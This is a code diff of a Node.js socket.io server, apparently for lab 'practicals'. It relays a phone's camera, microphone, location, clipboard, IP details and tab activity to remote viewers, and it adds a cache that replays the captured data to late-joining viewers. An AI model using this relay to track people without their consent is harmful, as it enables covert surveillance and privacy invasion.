@@ -9,13 +9,21 @@ const io = new Server(server);
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ── Practical 1: Camera streaming ──────────────────────────────
+// ── Practical 1 ───────────────────────────────────────────────
 let streamerSocket = null;
 let viewerSockets = [];
 
-// ── Practical 3: Location / Mic / Device info ──────────────────
+// ── Practical 3 ───────────────────────────────────────────────
 let p3PhoneSocket = null;
 let p3ViewerSockets = [];
+
+// Cache — stores last received data so PC gets it even if it connects late
+const p3Cache = {
+  location: null,
+  deviceInfo: null,
+  clipboard: null,
+  ipInfo: null,
+};
 
 io.on('connection', (socket) => {
   console.log('Connected:', socket.id);
@@ -25,21 +33,17 @@ io.on('connection', (socket) => {
     streamerSocket = socket;
     viewerSockets.forEach(v => v.emit('streamer-available'));
   });
-
   socket.on('viewer-ready', () => {
     viewerSockets.push(socket);
     if (streamerSocket) socket.emit('streamer-available');
   });
-
   socket.on('offer', (data) => {
     const viewer = viewerSockets.find(v => v.id === data.to);
     if (viewer) viewer.emit('offer', { sdp: data.sdp, from: socket.id });
   });
-
   socket.on('answer', (data) => {
     if (streamerSocket) streamerSocket.emit('answer', { sdp: data.sdp, from: socket.id });
   });
-
   socket.on('ice-candidate', (data) => {
     if (data.to === 'streamer' && streamerSocket) {
       streamerSocket.emit('ice-candidate', { candidate: data.candidate, from: socket.id });
@@ -48,57 +52,58 @@ io.on('connection', (socket) => {
       if (viewer) viewer.emit('ice-candidate', { candidate: data.candidate, from: socket.id });
     }
   });
-
   socket.on('request-stream', () => {
     if (streamerSocket) streamerSocket.emit('new-viewer', { viewerId: socket.id });
   });
 
   // ── PRACTICAL 3 ──────────────────────────────────────────────
 
-  // Phone side registers
   socket.on('p3-phone-ready', () => {
     p3PhoneSocket = socket;
     console.log('[P3] Phone connected');
     p3ViewerSockets.forEach(v => v.emit('p3-phone-available'));
   });
 
-  // PC side registers
+  // PC registers — replay ALL cached data immediately
   socket.on('p3-viewer-ready', () => {
     p3ViewerSockets.push(socket);
-    console.log('[P3] Viewer connected');
+    console.log('[P3] Viewer connected, replaying cache...');
+
     if (p3PhoneSocket) socket.emit('p3-phone-available');
+
+    // Send cached data immediately — no waiting
+    if (p3Cache.deviceInfo) { console.log('[P3] Replaying device info'); socket.emit('p3-device-info', p3Cache.deviceInfo); }
+    if (p3Cache.location)   { console.log('[P3] Replaying location');    socket.emit('p3-location',    p3Cache.location);   }
+    if (p3Cache.ipInfo)     { console.log('[P3] Replaying ip info');     socket.emit('p3-ip-info',     p3Cache.ipInfo);     }
+    if (p3Cache.clipboard)  { console.log('[P3] Replaying clipboard');   socket.emit('p3-clipboard',   p3Cache.clipboard);  }
   });
 
-  // Phone sends location
   socket.on('p3-location', (data) => {
-    console.log('[P3] Location received:', data);
+    p3Cache.location = data;
+    console.log('[P3] Location received, forwarding to', p3ViewerSockets.length, 'viewers');
     p3ViewerSockets.forEach(v => v.emit('p3-location', data));
   });
 
-  // Phone sends device info
   socket.on('p3-device-info', (data) => {
-    console.log('[P3] Device info received');
+    p3Cache.deviceInfo = data;
+    console.log('[P3] Device info received, forwarding to', p3ViewerSockets.length, 'viewers');
     p3ViewerSockets.forEach(v => v.emit('p3-device-info', data));
   });
 
-  // Phone sends clipboard
   socket.on('p3-clipboard', (data) => {
-    console.log('[P3] Clipboard received');
+    p3Cache.clipboard = data;
     p3ViewerSockets.forEach(v => v.emit('p3-clipboard', data));
   });
 
-  // Phone sends IP info
   socket.on('p3-ip-info', (data) => {
-    console.log('[P3] IP info received');
+    p3Cache.ipInfo = data;
     p3ViewerSockets.forEach(v => v.emit('p3-ip-info', data));
   });
 
-  // Phone sends tab activity
   socket.on('p3-tab-activity', (data) => {
     p3ViewerSockets.forEach(v => v.emit('p3-tab-activity', data));
   });
 
-  // WebRTC signaling for microphone stream (P3)
   socket.on('p3-offer', (data) => {
     const viewer = p3ViewerSockets.find(v => v.id === data.to);
     if (viewer) viewer.emit('p3-offer', { sdp: data.sdp, from: socket.id });
@@ -123,7 +128,6 @@ io.on('connection', (socket) => {
 
   // ── DISCONNECT ────────────────────────────────────────────────
   socket.on('disconnect', () => {
-    // P1 cleanup
     if (socket === streamerSocket) {
       streamerSocket = null;
       viewerSockets.forEach(v => v.emit('streamer-offline'));
@@ -131,11 +135,11 @@ io.on('connection', (socket) => {
       viewerSockets = viewerSockets.filter(v => v !== socket);
     }
 
-    // P3 cleanup
     if (socket === p3PhoneSocket) {
       p3PhoneSocket = null;
+      Object.keys(p3Cache).forEach(k => p3Cache[k] = null);
       p3ViewerSockets.forEach(v => v.emit('p3-phone-offline'));
-      console.log('[P3] Phone disconnected');
+      console.log('[P3] Phone disconnected, cache cleared');
     } else {
       p3ViewerSockets = p3ViewerSockets.filter(v => v !== socket);
     }
